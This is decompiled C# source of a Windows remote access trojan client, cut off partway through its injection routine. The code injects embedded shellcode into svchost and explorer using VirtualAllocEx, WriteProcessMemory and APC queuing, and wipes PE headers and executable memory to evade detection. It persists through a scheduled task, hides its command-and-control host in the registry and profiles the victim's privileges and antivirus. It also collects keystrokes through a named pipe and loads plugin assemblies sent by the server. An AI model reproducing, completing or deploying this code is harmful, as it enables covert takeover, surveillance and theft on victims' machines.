using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Messages;
using Microsoft.Win32;
using Models;
using TaskScheduler;
using algorithm;
using client.Properties;
using newClient;
using newClient.Comms;
using newClient.Comms.TCP;
using newClient.Comms.UDP;
using newClient.Utilities;
using newClient.keyboard;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("newClient")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("newClient")]
[assembly: AssemblyCopyright("Copyright ©  2024")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("713a1e9e-bbb4-485b-b294-35cb2a46694a")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace client.Properties
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal class Resources
	{
		private static ResourceManager resourceMan;

		private static CultureInfo resourceCulture;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				if (resourceMan == null)
				{
					ResourceManager resourceManager = (resourceMan = new ResourceManager("client.Properties.Resources", typeof(Resources).Assembly));
				}
				return resourceMan;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return resourceCulture;
			}
			set
			{
				resourceCulture = value;
			}
		}

		internal static string Host => ResourceManager.GetString("Host", resourceCulture);

		internal static byte[] Interop_TaskScheduler
		{
			get
			{
				object @object = ResourceManager.GetObject("Interop_TaskScheduler", resourceCulture);
				return (byte[])@object;
			}
		}

		internal static byte[] Oncode
		{
			get
			{
				object @object = ResourceManager.GetObject("Oncode", resourceCulture);
				return (byte[])@object;
			}
		}

		internal static string ProType => ResourceManager.GetString("ProType", resourceCulture);

		internal static byte[] session
		{
			get
			{
				object @object = ResourceManager.GetObject("session", resourceCulture);
				return (byte[])@object;
			}
		}

		internal Resources()
		{
		}
	}
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "17.11.0.0")]
	internal sealed class Settings : ApplicationSettingsBase
	{
		private static Settings defaultInstance = (Settings)(object)SettingsBase.Synchronized((SettingsBase)(object)new Settings());

		public static Settings Default => defaultInstance;
	}
}
namespace Client
{
	internal static class Program
	{
		[STAThread]
		private static void Main()
		{
			Logger.Info("\r\n\r\n");
			Logger.Info(Process.GetCurrentProcess().ProcessName + "   Main");
			AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
			AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
			Inject.Injectsvchost();
			Logger.Info("Injectsvchost");
			ProcessingCommand.GetProcessingLine();
			Logger.Info("GetProcessingLine");
			ProcessingAPPName.getname();
			Logger.Info("getname");
			ErasePEHeader.SetEraseRWX();
			Logger.Info("SetEraseRWX");
			ErasePEHeader.SetErasePEHeader();
			Logger.Info("SetErasePEHeader");
			MutexUtils.CreateMutex(config.MutexName, config.IsMutex);
			ThreadPool.QueueUserWorkItem(delegate
			{
				bypassSession.Run();
			});
			Logger.Info("CreateMutex");
			AssemblyLoader.otherassamebly.Add("Interop.TaskScheduler", Resources.Interop_TaskScheduler);
			ScheduleTask.CreateTask(Process.GetCurrentProcess().MainModule!.FileName);
			Logger.Info("CreateTask");
			SocketManger.Run();
		}

		[DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		private static extern IntPtr FindWindowA(string lpClassName, string lpWindowName);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		private static extern bool SetWindowTextA(IntPtr hWnd, string lpString);

		private static void FindWindow()
		{
		}

		private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
		{
			string name = new AssemblyName(args.Name).Name;
			if (!AssemblyLoader.otherassamebly.ContainsKey(name))
			{
				return null;
			}
			return Assembly.Load(AssemblyLoader.otherassamebly[name]);
		}

		private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
		{
			try
			{
				Logger.Info(e.ExceptionObject.ToString());
				Process currentProcess = Process.GetCurrentProcess();
				shellexec.WinExec(currentProcess.MainModule!.FileName, "exception", Path.GetDirectoryName(currentProcess.MainModule!.FileName), null);
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
	}
}
namespace Models
{
	[Flags]
	public enum AllocationProtect : uint
	{
		PAGE_EXECUTE = 0x10u,
		PAGE_EXECUTE_READ = 0x20u,
		PAGE_EXECUTE_READWRITE = 0x40u,
		PAGE_EXECUTE_WRITECOPY = 0x80u,
		PAGE_NOACCESS = 1u,
		PAGE_READONLY = 2u,
		PAGE_READWRITE = 4u,
		PAGE_WRITECOPY = 8u,
		PAGE_GUARD = 0x100u,
		PAGE_NOCACHE = 0x200u,
		PAGE_WRITECOMBINE = 0x400u
	}
	public class AssemblyMessage
	{
		public string AssemblyName;

		public object ob;

		public MethodInfo info;
	}
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}
	public enum InstructType
	{
		sleep = 16,
		kb,
		exit
	}
	public struct MEMORY_BASIC_INFORMATION
	{
		public IntPtr BaseAddress;

		public IntPtr AllocationBase;

		public uint AllocationProtect;

		public IntPtr RegionSize;

		public uint State;

		public uint Protect;

		public uint Type;
	}
	public enum PacketType : byte
	{
		instruction = 80,
		evenlog = 85,
		pulgin = 86,
		execpulgin = 87,
		Unloadpulgin = 88,
		UnloadClientIDpulgin = 89,
		exception = 90,
		clientinfo = 91
	}
	public struct PEB_WOW64
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		private readonly byte[] Reserved_1;

		public byte BeingDebugged;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
		private readonly byte[] Reserved2;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		private readonly long[] Reserved3;

		public long Ldr;

		public long ProcessParameters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
		private readonly long[] Reserved4;

		private readonly long AtlThunkSListPtr;

		private readonly long Reserved5;

		private readonly uint Reserved6;

		private readonly long Reserved7;

		private readonly uint Reserved8;

		private readonly uint AtlThunkSListPtr32;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 45)]
		private readonly long[] Reserved9;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
		private readonly byte[] Reserved10;

		private readonly long PostProcessInitRoutine;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]
		private readonly byte[] Reserved11;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
		private readonly long[] Reserved12;

		public uint SessionId;
	}
	[Flags]
	public enum ProcessAccessFlags : uint
	{
		All = 0x1F0FFFu,
		Terminate = 1u,
		CreateThread = 2u,
		VirtualMemoryOperation = 8u,
		VirtualMemoryRead = 0x10u,
		VirtualMemoryWrite = 0x20u,
		DuplicateHandle = 0x40u,
		CreateProcess = 0x80u,
		SetQuota = 0x100u,
		SetInformation = 0x200u,
		QueryInformation = 0x400u,
		QueryLimitedInformation = 0x1000u,
		Synchronize = 0x100000u
	}
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}
	public enum ProType : byte
	{
		TCP = 15,
		UDP,
		HTTP
	}
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;

		public IntPtr lpSecurityDescriptor;

		public int bInheritHandle;
	}
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFOEX
	{
		public STARTUPINFO StartupInfo;

		public IntPtr lpAttributeList;
	}
	public struct SYSTEM_INFO
	{
		public ushort processorArchitecture;

		private ushort reserved;

		public uint pageSize;

		public UIntPtr minimumApplicationAddress;

		public UIntPtr maximumApplicationAddress;

		public UIntPtr activeProcessorMask;

		public uint numberOfProcessors;

		public uint processorType;

		public uint allocationGranularity;

		public ushort processorLevel;

		public ushort processorRevision;
	}
	[StructLayout(LayoutKind.Explicit, Size = 16)]
	public struct _PEB
	{
		[FieldOffset(0)]
		public byte InheritedAddressSpace;

		[FieldOffset(1)]
		public byte ReadImageFileExecOptions;

		[FieldOffset(2)]
		public byte BeingDebugged;

		[FieldOffset(3)]
		public byte Spare;

		[FieldOffset(4)]
		public IntPtr Mutant;

		[FieldOffset(8)]
		public IntPtr ImageBaseAddress;

		[FieldOffset(12)]
		public IntPtr Ldr;

		[FieldOffset(16)]
		public IntPtr ProcessParameters;
	}
	public struct _PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;

		public IntPtr PebBaseAddress;

		public IntPtr AffinityMask;

		public IntPtr BasePriority;

		public UIntPtr UniqueProcessId;

		public IntPtr InheritedFromUniqueProcessId;

		public int Size => 6 * IntPtr.Size;
	}
	[Serializable]
	public class _sessiongrid
	{
		public string ip;

		public string MachineName;

		public string OperatingSystem;

		public string StatrTime;

		public string Install;

		public string Privileges;

		public string Antivirus;

		public string net;

		public string Country;

		public string name;

		public string ProtocolType;

		public string mmmd5;

		public string Remark;

		public string group;

		public int sessionKey;

		public string PrivateIp;
	}
}
namespace Messages
{
	public sealed class MessageheadData
	{
		public string _senssionSign;

		public int MessageLength;
	}
	[Serializable]
	public class pluginMessages
	{
		public string AssameblyName;

		public byte[] Assameblybytes;

		public string MethodInfo;

		public byte type;

		public int ClientID;

		public Dictionary<string, byte[]> AssameblybytesList = new Dictionary<string, byte[]>();
	}
}
namespace newClient
{
	internal sealed class config
	{
		public static bool IsMutex = true;

		public static readonly string SessionKey = MidManager.GetNewMid();

		public static readonly _sessiongrid session = clienthelper.GetSessioninfo();

		public static string path = Environment.GetEnvironmentVariable("systemdrive") + "\\ProgramData\\OneDrive\\PendingGPOs\\" + random + "gpo";

		public static ProType _PProType { get; set; }

		public static ProType PProType
		{
			get
			{
				if (_PProType == (ProType)0)
				{
					if (Environment.CommandLine.EndsWith("gotcp"))
					{
						_PProType = ProType.TCP;
					}
					else if (Environment.CommandLine.EndsWith("goudp"))
					{
						_PProType = ProType.UDP;
					}
					else
					{
						object data = AppDomain.CurrentDomain.GetData("ProType");
						if (data == null)
						{
							_PProType = (ProType)Enum.Parse(typeof(ProType), Resources.ProType);
						}
						else
						{
							_PProType = (ProType)Enum.Parse(typeof(ProType), data.ToString());
						}
					}
					return _PProType;
				}
				return _PProType;
			}
		}

		public static string host
		{
			get
			{
				try
				{
					string text = null;
					object data = AppDomain.CurrentDomain.GetData("Host");
					text = ((data == null) ? Resources.Host : data.ToString());
					if (text.Equals("bbbb"))
					{
						string hash = Hash.GetHash(Environment.MachineName, "@");
						using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + hash);
						byte[] array = registryKey.GetValue(hash + "ht") as byte[];
						if (array == null || array.Length != 0)
						{
							text = Encoding.UTF8.GetString(GZip.Decompress(array));
						}
					}
					return text;
				}
				catch
				{
				}
				return null;
			}
		}

		public static string MutexName
		{
			get
			{
				string result = "unknown";
				try
				{
					result = Hash.GetHash(Environment.MachineName, "$");
					return result;
				}
				catch
				{
					return result;
				}
			}
		}

		public static byte[] exceptionbytes
		{
			get
			{
				byte[] array = null;
				try
				{
					if (!File.Exists(Logger.currentExceptionPath))
					{
						return null;
					}
					array = File.ReadAllBytes(Logger.currentExceptionPath);
					if (array.Length == 0 || array.Length > 1048576)
					{
						return null;
					}
					File.Delete(Logger.currentExceptionPath);
					return array;
				}
				catch (Exception ex)
				{
					return Encoding.UTF8.GetBytes(ex.Message + ex.StackTrace);
				}
			}
		}

		public static string random
		{
			get
			{
				try
				{
					return Environment.MachineName.ToLower().Split(new char[1] { '-' })[1];
				}
				catch
				{
					return Environment.MachineName.ToLower();
				}
			}
		}
	}
}
namespace newClient.Utilities
{
	public class Administrator
	{
		public static bool IsAdministrator()
		{
			using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
			return new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
		}
	}
	public static class AssemblyLoader
	{
		private static Func<byte[], byte, int, int> SocketMangerSendMessage = SocketManger.SocketMangerSendMessage;

		private static ReaderWriterLockSlim readerWriterLockSlim = new ReaderWriterLockSlim();

		private static Dictionary<int, List<AssemblyMessage>> assameblyMethodInfo = new Dictionary<int, List<AssemblyMessage>>();

		public static Dictionary<string, byte[]> otherassamebly = new Dictionary<string, byte[]>();

		public static void AddAndLoadAssamebly(pluginMessages packetCommad)
		{
			readerWriterLockSlim.EnterWriteLock();
			try
			{
				foreach (KeyValuePair<string, byte[]> assameblybytes in packetCommad.AssameblybytesList)
				{
					if (!otherassamebly.ContainsKey(assameblybytes.Key))
					{
						otherassamebly.Add(assameblybytes.Key, assameblybytes.Value);
					}
				}
				AssemblyMessage item = loadAssamebly(packetCommad);
				if (!assameblyMethodInfo.TryGetValue(packetCommad.ClientID, out var value))
				{
					assameblyMethodInfo.Add(packetCommad.ClientID, new List<AssemblyMessage> { item });
				}
				else
				{
					value.RemoveAll((AssemblyMessage info) => info.AssemblyName.Equals(packetCommad.AssameblyName));
					value.Add(item);
				}
			}
			finally
			{
				readerWriterLockSlim.ExitWriteLock();
			}
			ErasePEHeader.SetErasePEHeader();
		}

		public static AssemblyMessage loadAssamebly(pluginMessages packetCommad)
		{
			Type type = Assembly.Load(packetCommad.Assameblybytes).GetType(packetCommad.AssameblyName);
			object ob = Activator.CreateInstance(type, SocketMangerSendMessage, packetCommad.type, packetCommad.ClientID);
			MethodInfo method = type.GetMethod(packetCommad.MethodInfo);
			return new AssemblyMessage
			{
				AssemblyName = packetCommad.AssameblyName,
				ob = ob,
				info = method
			};
		}

		public static void ExecAssamebly(pluginMessages Messages)
		{
			AssemblyMessage assemblyMessage = null;
			readerWriterLockSlim.EnterReadLock();
			try
			{
				assameblyMethodInfo.TryGetValue(Messages.ClientID, out var value);
				assemblyMessage = value?.FirstOrDefault((AssemblyMessage info) => info.AssemblyName.Equals(Messages.AssameblyName));
			}
			finally
			{
				readerWriterLockSlim.ExitReadLock();
			}
			assemblyMessage?.info.Invoke(assemblyMessage.ob, new object[1] { Messages.Assameblybytes });
		}

		public static void UnloadClientIDpulgin(byte[] bytes)
		{
			int key = BitConverter.ToInt32(bytes, 0);
			if (assameblyMethodInfo.TryGetValue(key, out var value))
			{
				value.ForEach(delegate(AssemblyMessage asobject)
				{
					asobject.info.Invoke(asobject.ob, new object[1] { Encoding.UTF8.GetBytes("u") });
				});
			}
			readerWriterLockSlim.EnterWriteLock();
			try
			{
				assameblyMethodInfo.Remove(key);
			}
			finally
			{
				readerWriterLockSlim.ExitWriteLock();
			}
		}

		public static void UnloadAssamebly(pluginMessages Messages)
		{
			AssemblyMessage assemblyMessage = null;
			readerWriterLockSlim.EnterWriteLock();
			try
			{
				if (assameblyMethodInfo.TryGetValue(Messages.ClientID, out var value))
				{
					assemblyMessage = value.FirstOrDefault((AssemblyMessage info) => info.AssemblyName.Equals(Messages.AssameblyName));
					if (assemblyMessage != null)
					{
						value.Remove(assemblyMessage);
					}
				}
			}
			finally
			{
				readerWriterLockSlim.ExitWriteLock();
			}
			assemblyMessage?.info.Invoke(assemblyMessage.ob, new object[1] { Encoding.UTF8.GetBytes("u") });
		}

		public static void UnloadAllAssamebly()
		{
			readerWriterLockSlim.EnterWriteLock();
			try
			{
				foreach (KeyValuePair<int, List<AssemblyMessage>> item in assameblyMethodInfo)
				{
					item.Value.ForEach(delegate(AssemblyMessage Info)
					{
						Info.info.Invoke(Info.ob, new object[1] { Encoding.UTF8.GetBytes("u") });
					});
				}
				assameblyMethodInfo.Clear();
				otherassamebly.Clear();
			}
			catch (Exception)
			{
			}
			finally
			{
				readerWriterLockSlim.ExitWriteLock();
			}
		}
	}
	public class bypassSession
	{
		public static void Run()
		{
			Process currentProcess = Process.GetCurrentProcess();
			while (currentProcess.SessionId == 0)
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName("winlogon");
					if (processesByName == null || processesByName.Length != 0)
					{
						Inject.Injectwinlogon();
						using NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "\\\\.\\pipe\\Global\\keyboardddd", PipeDirection.InOut);
						namedPipeClientStream.Connect(10000);
						Logger.Info("NamedPipeClientStream Connect");
						byte[] array = new byte[1024];
						while (true)
						{
							int num = namedPipeClientStream.Read(array, 0, array.Length);
							if (num != 0)
							{
								keyboardManagaers.KeyboardList.AddRange(array.Take(num));
								continue;
							}
							break;
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(3000);
			}
		}
	}
	public class clienthelper
	{
		private static string UseFormat = "yyyy'/'MM'/'dd' 'HH':'mm':'ss";

		public static string MachineName
		{
			get
			{
				try
				{
					return Environment.MachineName + "_" + Environment.UserName;
				}
				catch (Exception ex)
				{
					Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
				}
				return "unknown";
			}
		}

		public static string OperatingSystem
		{
			get
			{
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				//IL_000b: Expected O, but got Unknown
				//IL_0025: Unknown result type (might be due to invalid IL or missing references)
				//IL_002b: Expected O, but got Unknown
				try
				{
					ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
					try
					{
						ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
						try
						{
							if (enumerator.MoveNext())
							{
								ManagementObject val2 = (ManagementObject)enumerator.get_Current();
								string text = ((ManagementBaseObject)val2).get_Item("Caption").ToString()!.Replace("Microsoft ", "");
								return (text + ((ManagementBaseObject)val2).get_Item("OSArchitecture")).Replace(" ", "");
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch (Exception)
				{
				}
				return "unknown";
			}
		}

		public static string StatrTime
		{
			get
			{
				//IL_000a: Unknown result type (might be due to invalid IL or missing references)
				//IL_0010: Expected O, but got Unknown
				try
				{
					PerformanceCounter val = new PerformanceCounter("System", "System Up Time");
					try
					{
						val.NextValue();
						return new DateTime(DateTime.Now.Ticks - TimeSpan.FromSeconds(val.NextValue()).Ticks).ToString(UseFormat);
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch (Exception)
				{
				}
				return "unknown";
			}
		}

		public static string Install
		{
			get
			{
				try
				{
					string hash = Hash.GetHash(Environment.MachineName, "@");
					using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + hash);
					string text = registryKey.GetValue(hash + "T", null) as string;
					if (string.IsNullOrEmpty(text))
					{
						registryKey.SetValue(hash + "T", DateTime.Now.ToString(UseFormat));
					}
					return text ?? DateTime.Now.ToString(UseFormat);
				}
				catch (Exception)
				{
				}
				return "unknown";
			}
		}

		public static string currentProcess
		{
			get
			{
				try
				{
					return Process.GetCurrentProcess().ProcessName + ".exe";
				}
				catch (Exception)
				{
				}
				return "unknown";
			}
		}

		public static string antivirus
		{
			get
			{
				//IL_0019: Unknown result type (might be due to invalid IL or missing references)
				//IL_001f: Expected O, but got Unknown
				try
				{
					ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
					try
					{
						List<string> list = new List<string>();
						ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
						try
						{
							while (enumerator.MoveNext())
							{
								ManagementBaseObject current = enumerator.get_Current();
								list.Add(current.get_Item("displayName").ToString());
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
						return (list.Count == 0) ? "N/A" : string.Join("/", list.ToArray());
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch (Exception)
				{
				}
				return "unknown";
			}
		}

		public static string Country => null;

		public static string Privileges => getPrivileges(Process.GetCurrentProcess().Handle);

		public static string Netrunver => Environment.Version.ToString();

		internal static string PrivateIp
		{
			get
			{
				try
				{
					NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
					NetworkInterface[] array = allNetworkInterfaces;
					foreach (NetworkInterface networkInterface in array)
					{
						if (networkInterface.OperationalStatus != OperationalStatus.Up || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Loopback)
						{
							continue;
						}
						IPInterfaceProperties iPProperties = networkInterface.GetIPProperties();
						if (iPProperties.GatewayAddresses.Count == 0 || iPProperties.GatewayAddresses[0].Address.Equals(IPAddress.Parse("0.0.0.0")))
						{
							continue;
						}
						foreach (UnicastIPAddressInformation unicastAddress in iPProperties.UnicastAddresses)
						{
							if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(unicastAddress.Address))
							{
								return unicastAddress.Address?.ToString() ?? Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault((IPAddress adr) => adr.AddressFamily == AddressFamily.InterNetwork)!.ToString();
							}
						}
					}
				}
				catch (Exception)
				{
				}
				return "unknown";
			}
		}

		public static string getPrivileges(IntPtr Handle)
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				string result = null;
				if (NativeInvoke.OpenProcessToken(Handle, 10u, out var TokenHandle))
				{
					if (!NativeInvoke.GetTokenInformation(TokenHandle, 25u, zero, 0u, out var ReturnLength))
					{
						IntPtr intPtr = Marshal.AllocHGlobal(ReturnLength);
						if (NativeInvoke.GetTokenInformation(TokenHandle, 25u, intPtr, (uint)(int)ReturnLength, out ReturnLength))
						{
							IntPtr pSid = Marshal.ReadIntPtr(intPtr);
							result = Marshal.ReadInt32(NativeInvoke.GetSidSubAuthority(pSid, (uint)(Marshal.ReadInt32(NativeInvoke.GetSidSubAuthorityCount(pSid)) - 1))) switch
							{
								0 => "Untrusted", 
								4096 => "Low", 
								8192 => "Medium", 
								8448 => "Medium+ +", 
								12288 => "High", 
								16384 => "system", 
								_ => "unknown", 
							};
						}
						Marshal.FreeHGlobal(intPtr);
					}
					NativeInvoke.CloseHandle(TokenHandle);
				}
				return result;
			}
			catch (Exception)
			{
			}
			return "unknown";
		}

		public static _sessiongrid GetSessioninfo()
		{
			Logger.Info("GetSessioninfo");
			return new _sessiongrid
			{
				ip = null,
				MachineName = MachineName,
				OperatingSystem = OperatingSystem,
				StatrTime = StatrTime,
				Install = Install,
				Privileges = Privileges,
				Antivirus = antivirus,
				net = Netrunver,
				Country = Country,
				name = currentProcess,
				ProtocolType = null,
				mmmd5 = config.SessionKey,
				PrivateIp = PrivateIp
			};
		}
	}
	public class ErasePEHeader
	{
		public static int PAGE_EXECUTE_READWRITE = 64;

		public static int PAGE_READWRITE = 4;

		public static int MEM_COMMIT = 4096;

		public static int MEM_PRIVATE = 131072;

		public static int MEM_MAPPED = 262144;

		public static int MEM_IMAGE = 16777216;

		public static void SetErasePEHeader()
		{
			try
			{
				SYSTEM_INFO lpSystemInfo = default(SYSTEM_INFO);
				NativeInvoke.GetSystemInfo(out lpSystemInfo);
				long num = (long)(ulong)lpSystemInfo.minimumApplicationAddress;
				long num2 = (long)(ulong)lpSystemInfo.maximumApplicationAddress / 2L;
				IntPtr handle = Process.GetCurrentProcess().Handle;
				MEMORY_BASIC_INFORMATION lpBuffer;
				while (num < num2 && NativeInvoke.VirtualQueryEx(handle, (IntPtr)num, out lpBuffer, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)))
				{
					if (lpBuffer.Protect == PAGE_READWRITE && lpBuffer.State == MEM_COMMIT && lpBuffer.Type == MEM_MAPPED)
					{
						byte[] array = new byte[64];
						Marshal.Copy(lpBuffer.BaseAddress, array, 0, 64);
						if (array[0] == 77 && array[1] == 90)
						{
							int num3 = BitConverter.ToInt32(array, 60);
							if ((long)lpBuffer.RegionSize > 4096)
							{
								byte[] array2 = Enumerable.Repeat((byte)0, num3).ToArray();
								array2[0] = 80;
								array2[1] = 69;
								Marshal.Copy(array2, 0, lpBuffer.BaseAddress, num3);
								Marshal.Copy(array, 60, (IntPtr)((long)lpBuffer.BaseAddress + 60), 4);
							}
						}
					}
					num = (long)lpBuffer.BaseAddress + (long)lpBuffer.RegionSize;
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
		}

		public static void SetEraseRWX()
		{
			try
			{
				object data = AppDomain.CurrentDomain.GetData("H");
				if (data == null)
				{
					data = AppDomain.CurrentDomain.GetData("I");
					if (data == null)
					{
						return;
					}
				}
				int num = int.Parse(data.ToString());
				if (NativeInvoke.VirtualQueryEx(Process.GetCurrentProcess().Handle, (IntPtr)num, out var lpBuffer, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)))
				{
					uint lpflOldProtect;
					if (lpBuffer.Protect == PAGE_EXECUTE_READWRITE && AppDomain.CurrentDomain.GetData("H") != null)
					{
						int num2 = (int)Marshal.ReadIntPtr((IntPtr)num);
						int num3 = (int)Marshal.ReadIntPtr((IntPtr)(num + 4 + num2));
						int num4 = num2 + num3 + 8;
						Marshal.Copy(Enumerable.Repeat((byte)0, num4).ToArray(), 0, (IntPtr)num, num4);
						NativeInvoke.VirtualProtect((IntPtr)num, (IntPtr)num4, 4u, out lpflOldProtect);
					}
					else if (lpBuffer.Protect == PAGE_EXECUTE_READWRITE && AppDomain.CurrentDomain.GetData("I") != null)
					{
						Marshal.Copy(Enumerable.Repeat((byte)0, 65536).ToArray(), 0, (IntPtr)num, 65536);
						NativeInvoke.VirtualProtect((IntPtr)num, (IntPtr)65536, 4u, out lpflOldProtect);
					}
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
		}
	}
	public class Inject
	{
		public static void Injectsvchost()
		{
			Process currentProcess = Process.GetCurrentProcess();
			Logger.Info($"{Environment.UserName}    {currentProcess.Id}   {currentProcess.ProcessName} CommandLine :{Environment.CommandLine}");
			if (!Environment.UserName.Equals("system", StringComparison.OrdinalIgnoreCase) || currentProcess.SessionId != 0 || !currentProcess.ProcessName.Contains("svchost") || Environment.CommandLine.EndsWith("gotcp") || Environment.CommandLine.EndsWith("goudp"))
			{
				return;
			}
			Logger.Info("Injectsvchost true");
			string hash = Hash.GetHash(Environment.MachineName, "@");
			using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + hash))
			{
				registryKey.SetValue(hash + "ht", GZip.Compress(Encoding.UTF8.GetBytes(config.host)));
			}
			byte[] oncode = Resources.Oncode;
			string text = Environment.GetEnvironmentVariable("systemdrive") + "\\Windows\\System32\\svchost.exe";
			if (!File.Exists(text))
			{
				return;
			}
			PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
			STARTUPINFOEX lpStartupInfo = default(STARTUPINFOEX);
			lpStartupInfo.StartupInfo = default(STARTUPINFO);
			Logger.Info("CreateProcess");
			string lpCommandLine = ((config.PProType == ProType.TCP) ? "gotcp" : "goudp");
			if (NativeInvoke.CreateProcess(text, lpCommandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 4u, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation))
			{
				Logger.Info(text);
				IntPtr intPtr = NativeInvoke.VirtualAllocEx(lpProcessInformation.hProcess, IntPtr.Zero, oncode.Length, 4096, 64);
				int lpNumberOfBytesWritten = 0;
				if (NativeInvoke.WriteProcessMemory(lpProcessInformation.hProcess, intPtr, oncode, oncode.Length, ref lpNumberOfBytesWritten))
				{
					NativeInvoke.QueueUserAPC(intPtr, lpProcessInformation.hThread, IntPtr.Zero);
					NativeInvoke.ResumeThread(lpProcessInformation.hThread);
					Thread.Sleep(-1);
				}
			}
		}

		public static void Injectwinlogon()
		{
			int id = Process.GetProcessesByName("explorer")[0].Id;
			gogo(Resources.session, "explorer", id);
		}

		private static void gogo(byte[] shellcodebyts, string app, int processId)
		{
			try
			{
				Logger.Info(app + "  inject");
				Logger.Info($"Id : {processId}");
				IntPtr intPtr = NativeInvoke.OpenProcess(ProcessAccessFlags.All, bInheritHandle: false, processId);
				Logger.Info($"Open {intPtr}");
				IntPtr intPtr2 = NativeInvoke.VirtualAllocEx(intPtr, IntPtr.Zero, shellcodebyts.Length, 4096, 64);
